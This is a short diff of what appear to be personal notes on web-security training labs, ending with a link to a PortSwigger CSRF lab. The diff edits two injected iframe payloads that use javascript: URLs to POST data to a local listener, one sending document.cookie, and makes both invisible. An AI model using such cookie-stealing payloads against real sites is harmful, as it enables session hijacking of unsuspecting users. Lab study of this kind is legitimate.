@@ -36,10 +36,10 @@ if __name__ == '__main__':
 ```
 #### Atack payload
 ```javascript
-<iframe src="javascript:fetch('http://localhost:8080', { method: 'POST', body: 'message=Hello', headers: { 'Content-Type': 'text/plain' }}); ">
+<iframe src="javascript:fetch('http://localhost:8080', { method: 'POST', body: 'message=Hello', headers: { 'Content-Type': 'text/plain' }});" style="display: none;">
 ```
 ```javascript
-<iframe src="javascript:fetch('http://localhost:8080', { method: 'POST', body: document.cookie, headers: { 'Content-Type': 'text/plain' }}); ">
+<iframe src="javascript:fetch('http://localhost:8080', { method: 'POST', body: document.cookie, headers: { 'Content-Type': 'text/plain' }});" style="display: none;">
 ```
 # CSRF без всякой защиты (use exploit server)
 https://portswigger.net/web-security/csrf/lab-no-defenses
